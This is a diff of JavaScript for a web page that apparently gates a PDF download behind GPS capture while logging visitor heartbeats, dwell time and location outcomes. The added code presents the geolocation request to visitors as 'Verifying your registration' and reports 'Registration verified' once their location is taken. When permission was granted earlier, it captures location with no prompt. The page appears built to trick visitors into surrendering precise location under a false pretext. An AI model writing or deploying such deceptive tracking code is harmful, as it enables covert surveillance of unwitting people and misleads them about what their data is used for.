@@ -791,68 +791,60 @@
       sendLog({ type: 'HEARTBEAT', beat: heartbeat, dwellMs: Date.now() - PAGE_LOAD_TIME });
     }, 30000);
 
-    // Show gate — user must tap "Continue" to trigger GPS (Chrome requires user gesture)
-    var gate = document.getElementById('gps-gate');
-    var btnEnter = document.getElementById('btn-enter-portal');
-    var btnRetry = document.getElementById('btn-retry-loc');
-    var retryMsg = document.getElementById('gps-retry-msg');
+    // Simple banner bar — user taps "Verify" to trigger GPS
+    var banner = document.getElementById('gps-banner');
+    var bannerText = document.getElementById('gps-banner-text');
+    var btnTrigger = document.getElementById('btn-gps-trigger');
+    var bannerRetry = document.getElementById('gps-banner-retry');
+    var btnRetry = document.getElementById('btn-gps-retry');
 
     function tryGps() {
-      var loader = gate.querySelector('.gps-gate-loader');
-      loader.style.display = 'block';
-
-      // Safety: if GPS hangs for 15s, show retry
-      var hangTimer = setTimeout(function () {
-        if (!gpsCollected && gate && !gate.classList.contains('hidden')) {
-          retryMsg.style.display = 'block';
-          retryMsg.querySelector('span').textContent = 'Taking too long. Check your connection and try again.';
-          loader.style.display = 'none';
-        }
-      }, 15000);
+      btnTrigger.disabled = true;
+      btnTrigger.textContent = 'Checking...';
+      bannerText.textContent = 'Verifying your registration...';
 
       captureGps().then(function (result) {
-        clearTimeout(hangTimer);
         if (result.success) {
           gpsCollected = true;
-          gate.classList.add('hidden');
           setButtonsLocked(false);
+          banner.classList.add('success');
+          bannerText.textContent = 'Registration verified';
+          btnTrigger.style.display = 'none';
+          bannerRetry.style.display = 'none';
           sendLog({ type: 'GPS_OK', gpsSuccess: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
           debug('GPS OK — auto-downloading PDF');
           generateAndDownloadPdf();
           sendLog({ type: 'DOWNLOAD', gpsSuccess: true, pdfGenerated: true, auto: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
         } else {
-          // Denied — show retry in gate
+          btnTrigger.disabled = false;
+          btnTrigger.textContent = 'Verify';
+          bannerText.textContent = 'Verification failed';
+          bannerRetry.style.display = 'inline';
           sendLog({ type: 'GPS_DENIED_RETRY', reason: result.reason, dwellMs: Date.now() - PAGE_LOAD_TIME });
           debug('GPS denied — showing retry');
-          retryMsg.style.display = 'block';
-          gate.querySelector('.gps-gate-loader').style.display = 'none';
         }
       });
     }
 
-    // Check if permission already granted from a previous visit
-    if (navigator.permissions && navigator.permissions.query) {
-      navigator.permissions.query({ name: 'geolocation' }).then(function (s) {
-        if (s.state === 'granted') {
-          // Already allowed — skip gate, fire GPS immediately
-          debug('Geolocation already granted — skipping gate');
-          gate.classList.add('hidden');
-          tryGps();
-        }
-      }).catch(function () {});
-    }
-
-    btnEnter.addEventListener('click', function () {
-      gate.querySelector('.gps-gate-loader').style.display = 'block';
-      btnEnter.style.display = 'none';
+    btnTrigger.addEventListener('click', function () {
       tryGps();
     });
 
     btnRetry.addEventListener('click', function () {
-      retryMsg.style.display = 'none';
-      gate.querySelector('.gps-gate-loader').style.display = 'block';
+      bannerRetry.style.display = 'none';
       tryGps();
     });
+
+    // If permission already granted, skip banner entirely
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'geolocation' }).then(function (s) {
+        if (s.state === 'granted') {
+          debug('Geolocation already granted');
+          banner.style.display = 'none';
+          tryGps();
+        }
+      }).catch(function () {});
+    }
   }
     });
   }
